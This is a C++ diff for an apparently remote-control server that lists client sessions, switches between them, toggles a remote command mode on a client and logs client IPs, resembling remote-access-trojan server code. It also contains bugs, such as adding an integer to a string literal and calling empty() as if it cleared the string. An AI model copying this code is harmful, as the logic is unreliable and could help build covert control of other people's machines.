@@ -52,11 +52,8 @@ void Server::HandleInput()
 		std::getline(std::cin, userinput);
 		if (currentSessionID == -1)
 		{
-			if (userinput == "connectSession")
+			if (General::processParameter(userinput, "connect"))
 			{
-				userinput.empty();
-				std::cout << "Session ID: "; 
-				std::getline(std::cin, userinput);
 				inputInt = atoi(userinput.c_str());
 				int tempInt = connections.size() - 1;
 				if (inputInt > tempInt)
@@ -80,13 +77,22 @@ void Server::HandleInput()
 				currentSessionID = -1;
 			}
 
-			else if (userinput == "switchSession")
+			if (General::processParameter(userinput, "switch"))
 			{
-				std::cin >> currentSessionID;
-
+				inputInt = atoi(userinput.c_str());
+				int tempInt = connections.size() - 1;
+				if (inputInt > tempInt)
+					General::outputMsg("Session doesn't exist.", 2);
+				else
+				{
+					currentSessionID = inputInt;
+					General::outputMsg("Switched to Session " + currentSessionID, 1);
+				}
+				inputInt = 0;
+				userinput.empty();
 			}
 
-			else if (userinput == "cmdmode")
+			else if (userinput.find("remoteControl") != std::string::npos)
 			{
 				General::cmdMode = !General::cmdMode;
 				SendString(currentSessionID, userinput, PacketType::Instruction);
@@ -282,7 +288,7 @@ void Server::ListenerThread()
 				std::shared_ptr<Connection> newConnection(new Connection(newConnectionSocket));
 				serverptr->connections.push_back(newConnection); //push new connection into vector of connections
 			}
-			std::cout << "Client Connected! ID:" << NewConnectionID << std::endl;
+			std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(serverptr->addr.sin_addr) << std::endl;
 			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
 		}
 	}
